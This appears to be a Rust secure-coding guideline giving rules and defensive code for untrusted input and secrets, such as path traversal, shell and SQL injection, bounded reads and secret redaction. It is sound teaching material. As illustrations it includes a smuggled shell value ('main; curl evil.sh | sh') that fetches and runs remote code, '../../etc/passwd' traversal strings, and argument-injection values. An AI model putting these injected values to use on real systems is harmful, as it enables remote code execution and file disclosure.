---
id: security/secure-coding
title: Secure coding with untrusted input and secrets
summary: >-
  Rules for code that touches attacker-controlled data or secrets: parse into validated
  types, no panics on input, bound every read/allocation/recursion, checked integer math,
  path traversal, command and SQL injection (sqlx/diesel), untrusted deserialization, regex
  DoS, constant-time comparison, secrets in memory and logs (secrecy, zeroize), and
  filesystem TOCTOU.
area: security
tags: [untrusted-input, dos, panic, overflow, path-traversal, command-injection, sql-injection, sqlx, deserialization, serde, regex, timing, secrecy, zeroize, logging, toctou]
rust: "1.96"
edition: "2024"
crates:
  secrecy: "0.10"
  zeroize: "1.9"
  subtle: "2.6"
  sqlx: "0.9"
  diesel: "2.3"
  serde: "1.0"
  serde_json: "1.0"
  regex: "1.13"
  cap-std: "4.0"
  tempfile: "3.27"
  postcard: "1.1"
  tracing: "0.1"
  garde: "0.23"
  validator: "0.21"
  uuid: "1.26"
verified: 2026-09-29
sources:
  - https://doc.rust-lang.org/std/io/trait.Read.html#method.take
  - https://docs.rs/sqlx/0.9/sqlx/trait.SqlSafeStr.html
  - https://docs.rs/regex/latest/regex/#untrusted-input
  - https://docs.rs/secrecy/0.10/secrecy/
  - https://blog.rust-lang.org/2024/04/09/cve-2024-24576.html
  - https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html
---

# Secure coding with untrusted input and secrets

Rust removes memory corruption from safe code; it does not remove logic bugs, injection,
resource exhaustion, or leaked secrets. Everything in this file applies to *safe* Rust.

## SEC-01: Parse untrusted data into validated types at the boundary

Default: convert raw input (`String`, `&[u8]`, JSON) into domain types whose constructors
enforce the invariants, once, at the edge. Interior code takes `Username`, not `&str`, and
never re-validates.

```rust
#[derive(Debug, thiserror::Error)]
pub enum NameError {
    #[error("username must be 3-32 chars of [a-z0-9_]")]
    Invalid,
}

#[derive(Debug, Clone, PartialEq, Eq, serde::Deserialize)]
#[serde(try_from = "String")] // serde runs the validation too
pub struct Username(String);

impl TryFrom<String> for Username {
    type Error = NameError;
    fn try_from(s: String) -> Result<Self, Self::Error> {
        let ok = (3..=32).contains(&s.len())
            && s.bytes().all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'_');
        if ok { Ok(Self(s)) } else { Err(NameError::Invalid) }
    }
}
```

Validate with allowlists (what is permitted), not denylists (what looks bad). Keep the
field private so no code path can build an unvalidated value.

## SEC-02: Never panic on untrusted input

A panic is a denial-of-service: `panic = "abort"` kills the process; with unwinding, a
panic kills the request task, poisons any `std::sync::Mutex` it held, and may skip cleanup.
LLM-written parsers are full of `.unwrap()`, `[i]` and `a - b` on input-derived values.

```rust
// ❌ every line panics on hostile input
let len = u32::from_be_bytes(buf[0..4].try_into().unwrap()) as usize;
let body = &buf[4..4 + len];
// ✅ errors, not panics, and a size limit
#[derive(Debug, thiserror::Error)]
pub enum FrameError {
    #[error("truncated frame")]
    Truncated,
    #[error("declared length {0} exceeds limit")]
    TooLarge(u32),
}
const MAX_FRAME: usize = 64 * 1024;

pub fn parse_frame(input: &[u8]) -> Result<&[u8], FrameError> {
    let (len_bytes, rest) = input.split_first_chunk::<4>().ok_or(FrameError::Truncated)?;
    let declared = u32::from_be_bytes(*len_bytes);
    let len = usize::try_from(declared).map_err(|_| FrameError::TooLarge(declared))?;
    if len > MAX_FRAME {
        return Err(FrameError::TooLarge(declared));
    }
    rest.get(..len).ok_or(FrameError::Truncated)
}
```

Enforce it mechanically in parser/protocol modules:

```rust
#![deny(clippy::unwrap_used, clippy::expect_used, clippy::indexing_slicing,
        clippy::arithmetic_side_effects, clippy::panic)]
```

`expect` is fine for true invariants the program established itself (a regex literal
compiling, a constant key length), never for input. Fuzz every parser (FUZZ-01).

## SEC-03: Bound every read and every allocation sized by input

Default: every read from a socket, request body, file upload or decompressor has a byte
limit, and no `Vec::with_capacity(n)` / `vec![0; n]` uses an attacker-supplied `n`
without a cap. A 4-byte length prefix claiming 4 GiB is an allocation bomb.

```rust
use std::io::{self, Read};

pub fn read_bounded(r: impl Read, limit: u64) -> io::Result<Vec<u8>> {
    let mut buf = Vec::new();
    // Read one byte past the limit so "exactly limit" and "too big" are distinguishable.
    r.take(limit + 1).read_to_end(&mut buf)?;
    if buf.len() as u64 > limit {
        return Err(io::Error::new(io::ErrorKind::InvalidData, "input too large"));
    }
    Ok(buf)
}
```

- `read_to_end`/`read_to_string` without `take` on a network stream is unbounded memory.
- Decompression: limit the *decompressed* size by wrapping the decoder in `take` (a 1 MB
  gzip can inflate to gigabytes).
- Collections: cap element counts (array length, map entries, header count, multipart
  parts) as well as bytes. Pre-allocate `min(declared, CAP)`.
- Time is a resource: set timeouts on every network read (tokio `timeout`, server
  request/body deadlines — see web-security.md).

## SEC-04: Bound nesting depth and pick formats with limits

- **serde_json** stops at depth 128 by default. Do not enable the `unbounded_depth`
  feature / `disable_recursion_limit()` for untrusted input.
- **Your own recursive code** (recursive-descent parsers, tree walkers over user data,
  `Drop` of deep user-built trees) needs an explicit depth counter; stack overflow aborts
  the whole process, it cannot be caught.
- **Binary formats**: every length prefix is an allocation request; set format limits
  (e.g. `postcard::from_bytes` operates on a bounded slice — bound the slice). `bincode` is
  unmaintained (RUSTSEC-2025-0141); prefer postcard for compact serde binary.
- **YAML**: `serde_yaml` is deprecated and `serde_yml` unsound (RUSTSEC-2025-0068). Prefer
  TOML or JSON for config; for YAML use a maintained fork and never accept YAML from
  untrusted clients (alias expansion bombs).

## SEC-05: Use checked arithmetic for sizes, money, indices and counters

Default release builds **wrap** on integer overflow silently (`overflow-checks = false`);
debug builds panic. Neither is acceptable for security-relevant math.

```rust
pub fn total_price(unit_cents: u64, qty: u64) -> Option<u64> {
    unit_cents.checked_mul(qty) // None on overflow; caller returns 400
}
pub fn remaining(balance: u64, debit: u64) -> Result<u64, &'static str> {
    balance.checked_sub(debit).ok_or("insufficient funds")
}
```

- `checked_*` when overflow means invalid input; `saturating_*` for counters/metrics where
  clamping is correct; `wrapping_*` only for hashes/checksums where wrapping is the spec.
- `as` silently truncates and sign-converts: `len as u32`, `-1i64 as usize`. Use
  `u32::try_from(len)?`. Lints: `clippy::cast_possible_truncation`,
  `clippy::cast_sign_loss`, `clippy::cast_possible_wrap`.
- Security-sensitive binaries: turn on overflow checks in release; the cost is usually
  small and turns silent corruption into a (caught) panic.

```toml
[profile.release]
overflow-checks = true
```

## SEC-06: Regex on untrusted input: the regex crate, with limits

Default: the `regex` crate — it guarantees linear-time matching, so untrusted *haystacks*
can't cause catastrophic backtracking. Untrusted *patterns* still cost compile time and
memory; cap them:

```rust
pub fn user_regex(pattern: &str) -> Result<regex::Regex, regex::Error> {
    regex::RegexBuilder::new(pattern)
        .size_limit(1 << 20)
        .dfa_size_limit(1 << 20)
        .nest_limit(64)
        .build()
}
```

Never run backtracking engines (`fancy-regex` with look-around/backreferences, `pcre2`)
on untrusted patterns, and cap input length for them. Compile regexes once
(`LazyLock<Regex>`), not per request.

## SEC-07: Prevent path traversal

`Path::join` with user input is a traversal bug: `base.join("../../etc/passwd")` escapes
and `base.join("/etc/passwd")` *replaces* the base entirely.

Default when serving/writing files under a directory: **cap-std**, which resolves every
path relative to an opened directory handle and refuses `..`, absolute paths and symlinks
that escape it.

```rust
use cap_std::{ambient_authority, fs::Dir};

pub fn serve_upload(name: &str) -> std::io::Result<Vec<u8>> {
    let uploads = Dir::open_ambient_dir("/srv/uploads", ambient_authority())?;
    uploads.read(name) // `../../etc/passwd`, absolute paths and escaping symlinks all fail
}
```

Without cap-std, accept only `Component::Normal` parts (and still beware symlinks inside
the base):

```rust
use std::path::{Component, Path, PathBuf};

pub fn safe_join(base: &Path, untrusted: &str) -> Option<PathBuf> {
    let mut out = base.to_path_buf();
    for comp in Path::new(untrusted).components() {
        match comp {
            Component::Normal(part) => out.push(part),
            // `..`, `/`, `C:\`, `\\?\` and `.` are all rejected
            Component::ParentDir | Component::RootDir | Component::Prefix(_) | Component::CurDir => {
                return None;
            }
        }
    }
    Some(out)
}
```

Better still: don't use client-supplied names on disk at all — store under a generated ID
(UUID) and keep the original name as metadata. Canonicalize-then-`starts_with` is racy
(TOCTOU) and wrong for paths that don't exist yet.

## SEC-08: Run commands without a shell

Default: `std::process::Command::new(program).arg(x)` — each argument is passed as one argv
element and no shell interprets it.

```rust
// ❌ shell injection: user_ref = "main; curl evil.sh | sh"
Command::new("sh").arg("-c").arg(format!("git log {user_ref}"));
// ✅ no shell; reject option injection; `--` ends option parsing
pub fn git_log(user_ref: &str) -> std::io::Result<std::process::Output> {
    if user_ref.starts_with('-') {
        return Err(std::io::Error::new(std::io::ErrorKind::InvalidInput, "ref may not start with '-'"));
    }
    std::process::Command::new("git")
        .args(["log", "--oneline", "-n", "20"])
        .arg(user_ref)
        .arg("--")
        .output()
}
```

- **Argument injection** remains possible without a shell: a value starting with `-` is
  parsed as an option (`--upload-pack=...`, `-o ProxyCommand=...`). Reject leading `-` and
  use `--` where the program supports it.
- **Windows**: `.bat`/`.cmd` files are run through `cmd.exe`, which re-parses arguments.
  Rust ≥ 1.77.2 escapes them or returns an error (CVE-2024-24576), but don't pass untrusted
  arguments to batch files at all.
- Use absolute program paths or a controlled `PATH` in privileged processes; clear the
  environment (`env_clear()`) when spawning with elevated rights.

## SEC-09: SQL: bind parameters, allowlist identifiers

Default: every value goes through a bind parameter. Only compile-time-constant SQL text.

```rust
pub async fn find_user(pool: &sqlx::PgPool, email: &str) -> sqlx::Result<Option<User>> {
    sqlx::query_as::<_, User>("SELECT id, email FROM users WHERE email = $1")
        .bind(email)
        .fetch_optional(pool)
        .await
}
```

- sqlx 0.9 `query*()` accepts only `&'static str` or `AssertSqlSafe(..)` (`SqlSafeStr`).
  **Wrapping a `format!` of user data in `AssertSqlSafe` to make it compile is SQL
  injection.** Reviewers: grep for `AssertSqlSafe` and require a comment proving the string
  has no input-derived parts.
- Dynamic queries: `QueryBuilder::push_bind` for values; `push` only for fixed SQL
  fragments. Column/table names and `ASC/DESC` can't be bound — map input to an enum and
  emit `&'static str`:

```rust
#[derive(Clone, Copy)]
pub enum SortColumn { Email, CreatedAt }

impl SortColumn {
    fn as_sql(self) -> &'static str {
        match self { SortColumn::Email => "email", SortColumn::CreatedAt => "created_at" }
    }
}
// qb.push(" ORDER BY ").push(sort.as_sql());   // never .push(user_string)
```

- `LIKE` patterns: bind the value *and* escape `%`, `_` and `\` in it.
- `sqlx::query!` macros check SQL at compile time and always bind; prefer them.
- Diesel's query builder binds by construction; `diesel::sql_query` with `format!` has the
  same injection risk — use `.bind::<SqlType, _>(value)`.

## SEC-10: Deserialize untrusted data into concrete, strict types

- Deserialize into specific structs, not `serde_json::Value` that gets passed around and
  indexed with `v["field"]` (silent `Null`, no validation).
- Use `#[serde(deny_unknown_fields)]` on request types where unexpected fields should be
  rejected (mass-assignment: a client sending `"is_admin": true` to a struct you later
  merge into the DB model). Never deserialize a request directly into a DB entity.
- Apply byte limits before parsing (SEC-03) and validate after (SEC-01, `garde`/`validator`
  or `try_from`).
- Formats with type tags/polymorphism (YAML tags, some binary formats) or custom
  `Deserialize` impls that allocate by declared size need extra scrutiny and fuzzing.

## SEC-11: Compare secrets in constant time

`==` on byte slices returns at the first mismatch; an attacker measuring response times
can recover a token byte by byte. Use constant-time comparison for API keys, session
tokens, HMAC tags, CSRF tokens, reset codes.

```rust
pub fn tokens_equal(a: &[u8], b: &[u8]) -> bool {
    use subtle::ConstantTimeEq;
    a.ct_eq(b).into() // lengths may leak; the contents do not
}
```

For MACs use the MAC crate's `verify_slice` (constant time) instead of computing and
comparing. Better: store only a hash (SHA-256) of high-entropy API tokens and compare
hashes — the DB then leaks nothing usable. Passwords: Argon2 verification (crypto.md).

## SEC-12: Hold secrets in secrecy types; zeroize key material

Default: passwords, API keys, tokens and private keys live in `secrecy::SecretString` /
`SecretBox<T>`: `Debug` prints `[REDACTED]`, the value is zeroized on drop, and every read
is an explicit, greppable `.expose_secret()`.

```rust
use secrecy::{ExposeSecret, SecretString};

#[derive(Debug, serde::Deserialize)] // derived Debug is safe: SecretString redacts itself
pub struct ApiCredentials {
    pub client_id: String,
    pub client_secret: SecretString,
}

#[derive(zeroize::Zeroize, zeroize::ZeroizeOnDrop)]
pub struct SessionKey([u8; 32]);
```

Zeroization is best-effort: moves, `Vec` reallocation, `String` formatting and swap can
leave copies. Minimise copies (don't `.to_string()` an exposed secret), and don't claim
secrets "can't leak from memory".

## SEC-13: Keep secrets out of logs, errors and Debug output

The classic LLM leak: `#[derive(Debug)]` on a config or request struct with a
`password: String` field, then `tracing::info!(?config)` or `{:?}` in an error.

- Secret fields use secrecy types (SEC-12) or a manual `Debug` impl that redacts.
- `#[tracing::instrument(skip(password))]` or `skip_all` + explicit `fields(...)` on
  functions taking credentials; `instrument` records *all* arguments by default.

```rust
#[tracing::instrument(skip(password), fields(user = %username))]
pub async fn login(username: &str, password: SecretString) -> bool {
    check_credentials(username, password.expose_secret()).await
}
```

- Don't log full request/response headers or bodies; mark `Authorization`, `Cookie`,
  `Set-Cookie` sensitive (tower-http `SetSensitiveHeadersLayer`, web-security.md).
- Connection strings contain passwords: build them from parts and never log the URL.
- Error messages returned to clients are generic; details go to logs (WEB rules).

## SEC-14: Avoid filesystem TOCTOU races

Checking then acting (`if !path.exists() { File::create(path) }`) lets an attacker swap in a
symlink between the two calls. Make the operation itself atomic:

```rust
use std::io::Write;

// create only if absent — fails instead of following/overwriting
let f = std::fs::OpenOptions::new().write(true).create_new(true).open(path)?;

// temp files: unpredictable names, created exclusively
let mut tmp = tempfile::NamedTempFile::new_in(dir)?;
tmp.write_all(data)?;
tmp.as_file().sync_all()?;
tmp.persist(dir.join(final_name))?; // atomic rename into place
```

- Never build temp paths by hand in a shared `/tmp` (`/tmp/myapp.lock`); use `tempfile`.
- Check permissions/metadata on the opened `File` handle (`file.metadata()`), not on the
  path before opening.
- Under a directory an attacker can write to, use cap-std (SEC-07), which resolves without
  following escaping symlinks.
- Set restrictive permissions when creating secret files (`OpenOptionsExt::mode(0o600)` on
  Unix) instead of chmod-after-create.
